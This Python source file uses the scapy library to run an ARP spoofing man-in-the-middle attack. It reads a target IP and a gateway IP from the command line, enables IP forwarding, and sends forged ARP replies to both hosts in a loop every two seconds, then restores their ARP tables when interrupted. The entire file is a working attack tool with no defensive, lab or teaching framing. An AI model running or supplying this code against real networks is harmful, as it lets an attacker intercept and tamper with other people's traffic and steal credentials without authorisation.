import scapy.all as scapy
import os
import sys
import time
import argparse

class func(object):

    def get_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
        parser.add_argument("-g", "--gateway", dest="gateway", help="Specify gateway ip")
        return parser.parse_args()

    def get_mac(self,ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    
    def restore(self,destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, 4)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def spoof(self,target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    
    def init_attack(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        arguments = self.get_arguments()
        sent_packets = 0
        try:
            while True:
                self.spoof(arguments.target, arguments.gateway)
                self.spoof(arguments.gateway, arguments.target)
                sent_packets+=2
                print("\r[+] Sent packets: " + str(sent_packets)),
                sys.stdout.flush()
                time.sleep(2)

        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
            self.restore(arguments.target,arguments.gateway)
            self.restore(arguments.gateway, arguments.target)

client=func()
client.init_attack()
    



